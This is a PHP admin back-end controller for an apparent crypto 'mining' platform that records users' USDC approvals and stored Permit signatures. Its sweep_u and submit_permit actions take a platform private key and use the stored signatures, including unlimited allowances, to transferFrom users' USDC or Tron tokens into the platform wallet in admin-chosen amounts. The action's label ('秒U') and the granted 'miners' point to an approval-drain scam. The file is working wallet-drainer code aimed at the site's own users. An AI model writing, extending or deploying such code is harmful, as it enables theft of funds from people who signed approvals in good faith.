<?php

namespace app\admin\controller\user;

use app\common\controller\Backend;
use app\common\library\HecEth;
use app\common\library\HecEthSweep;
use app\common\library\HecMiner;
use app\common\library\HecTron;
use app\common\library\HecTronSweep;
use app\common\library\HecUsdcApprove;
use app\common\model\User;
use app\common\model\MinerType;
use think\Db;

/**
 * USDC 链上授权记录（会员管理）
 *
 * @icon fa fa-key
 */
class UsdcApprove extends Backend
{
    protected $model = null;
    protected $relationSearch = true;
    protected $noNeedRight = ['sync_all', 'sync_row'];

    /** @var array<string, string> */
    protected $minerStatusLabels = [
        'PENDING'  => '待审核',
        'APPROVED' => '已通过',
        'RUNNING'  => '运行中',
        'STOPPED'  => '已停止',
        'REJECTED' => '已拒绝',
        'EXPIRED'  => '已过期',
    ];

    public function _initialize()
    {
        parent::_initialize();
        $this->model = new \app\admin\model\hec\UsdcApprove;
    }

    public function index()
    {
        $this->request->filter(['strip_tags']);
        if ($this->request->isAjax()) {
$filter = $this->request->get('filter', '');            $filter = $filter ? (array)json_decode($filter, true) : [];            if (!empty($filter['email'])) {                $email = trim($filter['email']);                $filteredUserIds = User::where('email', 'like', "%{$email}%")->column('id');                unset($filter['email']);                $_GET['filter'] = json_encode($filter);            }
            list($where, $sort, $order, $offset, $limit) = $this->buildparams();
            $total = $this->model->where($where)->order($sort, $order)->count();
            $list = $this->model->where($where)->order($sort, $order)->limit($offset, $limit)->select();
            $userIds = array_unique(array_column(collection($list)->toArray(), 'user_id'));
            $users = [];
            $minerStats = [];
            if ($userIds) {
                $userRows = User::where('id', 'in', $userIds)
                    ->field('id,username,email,mac_balance,usdc_balance,usdt_balance')
                    ->select();
                foreach ($userRows as $u) {
                    $users[$u['id']] = $u->toArray();
                }
                $minerStats = $this->buildMinerStats($userIds);
            }
            foreach ($list as $row) {
                $u = $users[$row->user_id] ?? [];
                $ms = $minerStats[$row->user_id] ?? ['miner_count' => 0, 'miner_status_text' => '无矿机'];
                $row->username = $u['username'] ?? '-';
                $row->email = $u['email'] ?? '-';
                $row->miner_count = $ms['miner_count'];
                $row->miner_status_text = $ms['miner_status_text'];
                $row->hec_balance_text = $this->formatBalance($u['mac_balance'] ?? 0, 4);
                $row->account_usdc_text = $this->formatBalance($u['usdc_balance'] ?? ($u['usdt_balance'] ?? 0), 2);
                $row->allowance_text = HecUsdcApprove::allowanceText($row);
                $row->is_unlimited = strpos($row->allowance_text, '无限') !== false ? 1 : 0;
                $row->usdt_balance_text = HecUsdcApprove::balanceText($row);
                $row->approved_at_text = $row->approved_at ? date('Y-m-d H:i:s', $row->approved_at) : '-';
                $row->synced_at_text = $row->synced_at ? date('Y-m-d H:i:s', $row->synced_at) : '-';
                $row->swept_at_text = $row->swept_at ? date('Y-m-d H:i:s', $row->swept_at) : '-';
                $row->is_swept_text = !empty($row->is_swept) ? '已秒U' : '未秒U';
                $permitMeta = HecUsdcApprove::readPermitMeta($row);
                $row->has_permit_signature = $permitMeta['signature'] !== '' ? 1 : 0;
            }
            return json(['total' => $total, 'rows' => $list]);
        }
        return $this->view->fetch();
    }

    public function add()
    {
        $this->error('授权记录由用户链上操作自动生成，不可手动添加');
    }

    public function edit($ids = null)
    {
        $this->error('授权记录不可编辑');
    }

    public function del($ids = null)
    {
        $this->error('授权记录不可删除');
    }

    /**
     * 同步全部账户链上授权额度与 USDC 余额
     */
    public function sync_all()
    {
        if (!$this->request->isPost()) {
            $this->error('非法请求');
        }

        $result = HecUsdcApprove::syncAll();
        $msg = sprintf(
            '同步完成：共 %d 条，成功 %d 条，失败 %d 条',
            $result['total'],
            $result['success'],
            $result['failed']
        );
        if (!empty($result['errors'])) {
            $msg .= '。' . implode('；', $result['errors']);
        }

        $this->success($msg, null, $result);
    }

    /**
     * 同步单条记录的链上授权额度与 USDC 余额
     */
    public function sync_row()
    {
        if (!$this->request->isPost()) {
            $this->error('非法请求');
        }

        $ids = (int)$this->request->post('ids', 0);
        if ($ids <= 0) {
            $this->error('缺少记录 ID');
        }

        $row = $this->model->get($ids);
        if (!$row) {
            $this->error('记录不存在');
        }

        $result = HecUsdcApprove::syncRow($row);
        if (empty($result['ok'])) {
            $this->error($result['error'] ?? '同步失败');
        }

        $this->success('同步成功');
    }

    /**
     * 可选矿机类型列表（发放矿机弹窗）
     */
    public function miner_types()
    {
        $rows = MinerType::where('status', 1)->order('weigh desc,id asc')->select();
        $list = [];
        foreach ($rows as $row) {
            $price = rtrim(rtrim(number_format((float)$row['price'], 2, '.', ''), '0'), '.');
            $daily = rtrim(rtrim(number_format((float)$row['daily_output'], 8, '.', ''), '0'), '.');
            $list[] = [
                'id'            => (int)$row['id'],
                'name'          => (string)$row['name'],
                'price'         => $price,
                'daily_output'  => $daily,
                'validity_days' => (int)$row['validity_days'],
                'label'         => sprintf('%s（$%s / %s HEC/天 / %d天）', $row['name'], $price, $daily, (int)$row['validity_days']),
            ];
        }
        $this->success('', null, ['list' => $list]);
    }

    /**
     * 为授权用户发放矿机
     */
    public function grant_miner()
    {
        if (!$this->request->isPost()) {
            $this->error('非法请求');
        }

        $ids = (int)$this->request->post('ids', 0);
        $minerTypeId = (int)$this->request->post('miner_type_id', 0);
        if ($ids <= 0 || $minerTypeId <= 0) {
            $this->error('请选择矿机类型');
        }

        $row = $this->model->get($ids);
        if (!$row) {
            $this->error('记录不存在');
        }

        try {
            $miner = HecMiner::adminGrant((int)$row->user_id, $minerTypeId, (string)$row->wallet_address);
        } catch (\Throwable $e) {
            $this->error($e->getMessage());
        }

        $this->success('矿机发放成功', null, $miner);
    }

    /**
     * 将链下 Permit 提交上链（不划扣）
     */
    public function submit_permit()
    {
        if (!$this->request->isPost()) {
            $this->error('非法请求');
        }

        $ids = $this->request->post('ids', '');
        $privateKey = (string)$this->request->post('private_key', '');
        if ($ids === '' || trim($privateKey) === '') {
            $this->error('请填写授权对象私钥');
        }

        $row = $this->model->get((int)$ids);
        if (!$row) {
            $this->error('记录不存在');
        }

        $fromWallet = HecEth::normalizeAddress($row->wallet_address);
        $spender = HecEth::normalizeAddress($row->spender_address ?: HecEth::adminWallet());
        if (!HecEth::isEvmAddress($fromWallet) || !HecEth::isEvmAddress($spender)) {
            $this->error('钱包地址无效');
        }

        list($permitFallback, $permitErr) = $this->buildPermitFallback($row);
        if (!$permitFallback) {
            $this->error($permitErr ?: '无可用的 Permit 签名');
        }

        try {
            $txid = HecEthSweep::submitPermitOnChain(
                $privateKey,
                $fromWallet,
                $spender,
                $permitFallback['value'],
                (int)$permitFallback['deadline'],
                $permitFallback['signature'],
                $permitFallback['nonce'] ?? ''
            );
        } catch (\Throwable $e) {
            $this->error($e->getMessage());
        } finally {
            $privateKey = '';
            unset($privateKey);
        }

        HecUsdcApprove::syncRow($row);
        $this->success('Permit 已提交上链', null, [
            'txid' => $txid,
            'url'  => 'https://etherscan.io/tx/' . $txid,
        ]);
    }

    /**
     * 秒U：使用平台授权钱包私钥 transferFrom 划扣（私钥不落库）
     */
    public function sweep_u()
    {
        if (!$this->request->isPost()) {
            $this->error('非法请求');
        }

        $ids = $this->request->post('ids', '');
        $amount = trim((string)$this->request->post('amount', ''));
        $privateKey = (string)$this->request->post('private_key', '');

        if ($ids === '' || $amount === '' || trim($privateKey) === '') {
            $this->error('请填写秒U数量与私钥');
        }

        $row = $this->model->get((int)$ids);
        if (!$row) {
            $this->error('记录不存在');
        }

        $fromWallet = trim((string)$row->wallet_address);
        $network = trim((string)($row->network ?: 'Ethereum'));
        $isEthereum = strcasecmp($network, 'Ethereum') === 0 || HecEth::isEvmAddress($fromWallet);

        if ($isEthereum) {
            $spender = HecEth::normalizeAddress($row->spender_address ?: HecEth::adminWallet());
            $toAddress = HecEth::adminWallet();
            if (!$toAddress || !HecEth::isEvmAddress($toAddress)) {
                $this->error('平台收款钱包未配置，请在后台 HEC配置 填写 0x 开头的 Ethereum 地址');
            }
            if (!HecEth::isEvmAddress($fromWallet)) {
                $this->error('用户钱包地址无效');
            }
            if (!$spender || !HecEth::isEvmAddress($spender)) {
                $this->error('授权对象地址无效');
            }

            list($permitFallback, $permitErr) = $this->buildPermitFallback($row);
            $amountRaw = HecEth::priceToRaw($amount);
            try {
                $chainAllow = HecEth::fetchAllowance($fromWallet, $spender);
            } catch (\Throwable $e) {
                $chainAllow = '0';
            }
            if (bccomp($chainAllow, $amountRaw, 0) < 0 && !$permitFallback) {
                $this->error($permitErr ?: '链上授权为 0，且数据库无 Permit 签名。请让用户在前端重新完成 USDC 授权。');
            }

            try {
                $result = HecEthSweep::transferFrom($privateKey, $fromWallet, $spender, $toAddress, $amount, $permitFallback);
            } catch (\Throwable $e) {
                $this->error($e->getMessage());
            } finally {
                $privateKey = '';
                unset($privateKey);
            }

            HecUsdcApprove::syncRow($row);
            HecUsdcApprove::recordSweep($row, $result['amount'], $result['txid']);

            $payload = [
                'txid'   => $result['txid'],
                'amount' => $result['amount'],
                'from'   => $result['from'],
                'to'     => $result['to'],
                'url'    => 'https://etherscan.io/tx/' . $result['txid'],
            ];
            if (!empty($result['permit_txid'])) {
                $payload['permit_txid'] = $result['permit_txid'];
                $payload['permit_url'] = 'https://etherscan.io/tx/' . $result['permit_txid'];
            }
            $msg = sprintf('已成功划扣 %s USDC 到平台钱包', $result['amount']);
            if (!empty($result['permit_txid'])) {
                $msg .= '（Permit 已先提交上链）';
            }
            $this->success($msg, null, $payload);
        }

        $spender = trim((string)($row->spender_address ?: HecTron::adminWallet()));
        $toAddress = HecTron::adminWallet();
        if (!$toAddress || !HecTron::isTronAddress($toAddress)) {
            $this->error('平台收款钱包未配置');
        }
        if (!HecTron::isTronAddress($fromWallet)) {
            $this->error('用户钱包地址无效');
        }
        if (!HecTron::isTronAddress($spender)) {
            $this->error('授权对象地址无效');
        }

        try {
            $result = HecTronSweep::transferFrom($privateKey, $fromWallet, $spender, $toAddress, $amount);
        } catch (\Throwable $e) {
            $this->error($e->getMessage());
        } finally {
            $privateKey = '';
            unset($privateKey);
        }

        HecUsdcApprove::syncRow($row);
        HecUsdcApprove::recordSweep($row, $result['amount'], $result['txid']);

        $this->success('秒U成功', null, [
            'txid'   => $result['txid'],
            'amount' => $result['amount'],
            'from'   => $result['from'],
            'to'     => $result['to'],
            'url'    => 'https://tronscan.org/#/transaction/' . $result['txid'],
        ]);
    }

    /**
     * @return array{0:?array,1:string}
     */
    protected function buildPermitFallback($row)
    {
        $meta = HecUsdcApprove::readPermitMeta($row);
        if ($meta['signature'] === '') {
            return [null, '数据库未保存 Permit 签名（可能授权时未迁移 permit_signature 字段）。请让用户在前端重新完成一次 USDC 授权。'];
        }

        $deadline = (int)$meta['deadline'];
        if ($deadline <= 0) {
            $deadline = (int)User::where('id', (int)$row->user_id)->value('permit_expires_at');
        }
        if ($deadline <= 0) {
            $deadline = (int)($row->approved_at ?: 0) + HecEth::PERMIT_DEADLINE_SECONDS;
        }
        if ($deadline <= time()) {
            return [null, 'Permit 签名已过期，请让用户重新授权'];
        }

        return [[
            'signature' => $meta['signature'],
            'deadline'  => $deadline,
            'value'     => self::resolvePermitValueRaw($meta['value_raw']),
            'nonce'     => $meta['nonce'],
        ], ''];
    }

    protected function resolvePermitValueRaw($valueRaw)
    {
        $valueRaw = trim((string)$valueRaw);
        if ($valueRaw === '' || bccomp($valueRaw, '0', 0) <= 0) {
            return HecEth::maxPermitValueRaw();
        }
        if (HecUsdcApprove::isUnlimitedRaw($valueRaw)) {
            return $valueRaw;
        }
        return $valueRaw;
    }

    /**
     * @param int[] $userIds
     * @return array<int, array{miner_count:int, miner_status_text:string}>
     */
    protected function buildMinerStats(array $userIds)
    {
        $result = [];
        foreach ($userIds as $uid) {
            $result[(int)$uid] = ['miner_count' => 0, 'miner_status_text' => '无矿机'];
        }
        if (!$userIds) {
            return $result;
        }

        $rows = Db::name('user_miner')
            ->where('user_id', 'in', $userIds)
            ->field('user_id, status, COUNT(*) AS cnt')
            ->group('user_id, status')
            ->select();

        $order = ['RUNNING', 'PENDING', 'APPROVED', 'STOPPED', 'EXPIRED', 'REJECTED'];
        $grouped = [];
        foreach ($rows as $row) {
            $uid = (int)$row['user_id'];
            if (!isset($grouped[$uid])) {
                $grouped[$uid] = [];
            }
            $grouped[$uid][(string)$row['status']] = (int)$row['cnt'];
        }

        foreach ($grouped as $uid => $statusMap) {
            $count = array_sum($statusMap);
            $parts = [];
            foreach ($order as $status) {
                if (empty($statusMap[$status])) {
                    continue;
                }
                $label = $this->minerStatusLabels[$status] ?? $status;
                $parts[] = $label . '×' . $statusMap[$status];
            }
            foreach ($statusMap as $status => $cnt) {
                if (in_array($status, $order, true)) {
                    continue;
                }
                $label = $this->minerStatusLabels[$status] ?? $status;
                $parts[] = $label . '×' . $cnt;
            }
            $result[$uid] = [
                'miner_count'       => $count,
                'miner_status_text' => $parts ? implode('，', $parts) : '无矿机',
            ];
        }

        return $result;
    }

    protected function formatBalance($value, $decimals)
    {
        return number_format((float)$value, $decimals, '.', '');
    }
}
